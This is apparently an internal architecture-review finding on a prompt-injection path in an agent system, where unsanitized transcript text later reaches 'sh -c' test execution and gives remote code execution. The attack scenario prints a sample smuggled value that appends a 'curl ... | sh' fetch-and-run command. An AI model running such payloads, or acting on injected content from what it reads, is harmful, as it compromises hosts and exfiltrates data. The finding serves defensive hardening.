---
labels: [architecture-review, adversarial]
---
# Prompt Injection & RCE: Verbatim Ingestion and Shell Test Execution (CHEAT-002)

**Finding:**
There is a severe prompt injection vulnerability stemming from two interacting components: The Pre-Compaction Hook extracts raw text and tool results *verbatim* (without sanitization) into SurrealDB, and the Arbor HTR parallel verification loop executes test commands via shell execution (`sh -c`) as documented in `mock_audit_report.md` (CHEAT-002).

**Current Assumption:**
The architecture assumes that session JSONL transcripts provided by agent hosts are inherently safe and contain no adversarial shell payloads. It trusts that code refinements are well-formed and non-malicious.

**Attack Scenario:**
An attacker feeds the agent a disguised prompt injection or payload hidden inside a seemingly benign code repository or chat turn. The agent processes this, and the Pre-Compaction Hook ingests it verbatim. Later, during the Arbor HTR loop code synthesis and testing phase, the unsanitized string containing the attacker's payload (e.g., `test_command; curl malicious.sh | sh`) is parsed and executed directly by `sh -c`.

**Blast Radius:**
Remote Code Execution (RCE) on the host machine. The attacker can execute arbitrary commands with the privileges of the Mythrax Daemon, compromising the entire host system, accessing sensitive files, and exfiltrating data.

**Recommended Structural Change:**
1. Implement strict sanitization of all transcripts prior to execution.
2. Replace `sh -c` test execution with direct execution via `std::process::Command::new(program).args(args)`.
3. Sandbox the Arbor HTR execution environments (e.g., using lightweight containers, gVisor, or restricted runtimes) to limit the damage even if malicious code is executed.
